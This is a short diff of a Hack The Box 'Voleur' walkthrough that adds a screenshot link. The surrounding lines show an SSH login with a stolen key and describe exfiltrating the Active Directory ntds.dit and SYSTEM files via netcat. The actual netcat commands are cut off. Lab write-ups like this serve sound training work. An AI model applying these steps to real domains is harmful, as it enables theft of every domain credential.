@@ -168,7 +168,7 @@ chmod 600 id_rsa
 ssh -i id_rsa svc_backup@voleur.htb -p 2222
 ```
 NTDS and SYSTEM File Exfiltration: Inside the SSH session, the C drive is mounted at /mnt/c. The svc_backup user has access to a Backups/Active Directory directory within C:\IT\Third-Line Support. This directory contains the critical ntds.dit and SYSTEM files. These files are exfiltrated using netcat.
-
+![User](Pictures/htb_voleur_Admin_hash_prep.png)
 Bash
 ```
 # On the target
